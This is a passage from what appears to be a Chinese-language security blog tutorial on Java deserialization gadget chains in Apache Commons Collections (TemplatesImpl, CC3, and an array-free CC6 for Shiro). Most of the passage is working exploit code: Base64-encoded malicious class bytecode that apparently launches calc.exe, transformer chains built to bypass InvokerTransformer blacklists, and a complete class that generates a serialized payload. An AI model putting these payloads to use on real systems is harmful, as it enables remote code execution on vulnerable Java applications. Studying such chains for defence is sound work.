class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA&quot;</span> +</span><br><span class="line">            <span class="string">&quot;CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP&quot;</span> +</span><br><span class="line">            <span class="string">&quot;TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0&quot;</span> +</span><br><span class="line">            <span class="string">&quot;aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm&quot;</span> +</span><br><span class="line">            <span class="string">&quot;KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y&quot;</span> +</span><br><span class="line">            <span class="string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw&quot;</span> +</span><br><span class="line">            <span class="string">&quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp&quot;</span> +</span><br><span class="line">            <span class="string">&quot;bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb&quot;</span> +</span><br><span class="line">            <span class="string">&quot;DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB&quot;</span> +</span><br><span class="line">            <span class="string">&quot;AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj&quot;</span> +</span><br><span class="line">            <span class="string">&quot;dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z&quot;</span> +</span><br><span class="line">            <span class="string">&quot;bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot;</span> +</span><br><span class="line">            <span class="string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA&quot;</span> +</span><br><span class="line">            <span class="string">&quot;AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA&quot;</span> +</span><br><span class="line">            <span class="string">&quot;AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA&quot;</span> +</span><br><span class="line">            <span class="string">&quot;DwABABAAAAACABE=&quot;</span>);</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    obj.newTransformer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="http://124.71.147.32/uploads/2024/03/15/65f3f0c22c1cc.png"  alt="image-20240315145458490"></p>
<h2 id="0x05-cc3"><a href="#0x05-cc3" class="headerlink" title="0x05 cc3"></a>0x05 cc3</h2><p>利用版本：CommonsCollections 3.1 - 3.2.1</p>
<p>限制：JDK版本，8u71 版本以下可用</p>
<p>在cc1中我们可以通过<code>TransformedMap</code>执⾏任意Java⽅法，上边有分析了<code>TemplatesImpl#newTransformer</code>来加载字节码!</p>
<p>那现在就把结合一下。</p>
<p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    Transformer[] invokerTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>,transformerChain);</span><br><span class="line"></span><br><span class="line">    transformedMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这块就简单的通过<code>transformedMap.put()</code>来触发一下。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f830989cc60.png"  alt="image-20240318201624084"></p>
<p>但是这并不是真正的cc3，查看ysoserial的代码</p>
<p>ysoserial中的CC3，可以发现其中没有使⽤到<code>InvokerTransformer</code>原因是什么呢？</p>
<p><a href="https://img2022.cnblogs.com/blog/3010963/202211/3010963-20221111172753345-614104318.png"><img   src="https://img2022.cnblogs.com/blog/3010963/202211/3010963-20221111172753345-614104318.png"  alt="image-20221111172751090"></a></p>
<blockquote>
<p>2015年初，@frohoff和@gebl发布了<a class="link"   href="https://frohoff.github.io/appseccali-marshalling-pickles/" > Marshalling Pickles：how deserializing objects will ruin your day<i class="fas fa-external-link-alt"></i></a>，以及反序列化利用工具yaoserial，安全开发者自然会去寻找一种安全的过滤方法，类似<a class="link"   href="https://github.com/ikkisoft/SerialKiller" >SerialKiller<i class="fas fa-external-link-alt"></i></a>这样的工具随之诞生：</p>
<p>SerialKiller是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在其发布的第⼀个版本代码中，我们可以看到其给出了最初的⿊名单</p>
</blockquote>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f843fe06cde.png"  alt="image-20240318213910008"></p>
<p>这个⿊名单中<code>InvokerTransformer</code>赫然在列，也就切断了<code>CommonsCollections1</code>的利⽤链。ysoserial随后增加了不少新的Gadgets，其中就包括<code>CommonsCollections3</code>。</p>
<p>CommonsCollections3的⽬的很明显，就是为了绕过⼀些规则对InvokerTransformer的限制。 CommonsCollections3并没有使⽤到InvokerTransformer来调⽤任意⽅法，⽽是⽤到了另⼀个 类， <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
<p>这个类的构造⽅法中调⽤<code>(TransformerImpl) templates.newTransformer()</code>,免去了我们使⽤InvokerTransformer⼿⼯调⽤ newTransformer() ⽅法这⼀步</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f8445a9d634.png"  alt="image-20240318214042668"></p>
<p>当然，缺少了InvokerTransformer，<code>TrAXFilter</code>的构造⽅法也是⽆法调⽤的。这⾥会⽤到⼀个新的Transformer，就是 <code>org.apache.commons.collections.functors.InstantiateTransformer</code> 。<code>InstantiateTransformer</code>也是⼀个实现了<code>Transformer</code>接⼝的类，他的作⽤就是调⽤构造⽅法.</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f845b1d234c.png"  alt="image-20240318214625872"></p>
<p>目标很明确了，利⽤<code>InstantiateTransformer</code>来调⽤到<code>TrAXFilter</code>的构造⽅法，再利⽤其构造⽅法⾥的<code>templates.newTransformer()</code>调⽤到<code>TemplatesImpl</code>⾥的字节码</p>
<p>构造的Transformer调⽤链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"> 					<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"> 					<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line"> 								<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line"> 								<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line"> 			&#125;;</span><br></pre></td></tr></table></figure>

<p>替换到前⾯的demo中，也能成功触发，避免了使⽤<code>InvokerTransformer</code></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> E</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>,transformerChain);</span><br><span class="line">    transformedMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="0x06-无数组cc6"><a href="#0x06-无数组cc6" class="headerlink" title="0x06 无数组cc6"></a>0x06 无数组cc6</h2><p>众所周知，原生的cc6打shiro会报错！p牛最后总结出的原因如下：</p>
<p>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
<p>那我们如何来解决这个问题？</p>
<p>前面说到的<code>TemplatesImpl</code>就可以利用了，通过下面这几行代码来执行一段Java的字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;...bytescode&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>

<p>接下来利用<code>InvokerTransformer</code>调用<code>TemplatesImpl#newTransformer</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里仍然用到了Transformer数组，不符合条件，在CommonsCollections6中，我们用到了一个类<code>TiedMapEntry</code>，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。 <code>TiedMapEntry</code>类有个<code>getValue</code>方法，调用了map的get方法，并传入key：</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/18/65f83210e6d3b.png"  alt="image-20240318202240881"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当这个map是LazyMap时，其get方法就是触发transform的关键点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">		map.put(key, value);</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br><span class="line">		<span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以往构造CommonsCollections Gadget的时候，对<code>LazyMap#get</code>方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象</p>
<p>但是此时我们无法使用<code>Transformer</code>数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个<code>LazyMap#get</code>的参数key，会被传进transform()，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。</p>
<p>那么我们再回看前面的Transform数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>new ConstantTransformer(obj)</code> 这一步完全是可以去除了，数组长度变成1，那么数组也就不需要了。</p>
<p>改造一下CommonsCollections6</p>
<p>首先还是创建TemplatesImpl对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;...bytescode&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一个人畜无害的方法，比如<code>getClass</code> ，避免恶意方法在构造Gadget的时候触发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>再把之前的<code>CommonsCollections6</code>的代码复制过来，然后改上一节说到的点，就是将原来TiedMapEntry构造时的第二个参数key，改为前面创建的TemplatesImpl对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">outerMap.clear();</span><br></pre></td></tr></table></figure>

<p>和我之前的CommonsCollections6稍有不同的是，我之前是使用 outerMap.remove(“keykey”); 来移 除key的副作用，现在是通过 outerMap.clear(); ，效果相同。 最后，将 InvokerTransformer 的方法从人畜无害的 getClass ，改成 newTransformer ，正式完成武 器装配。</p>
<h3 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsShiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getpayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

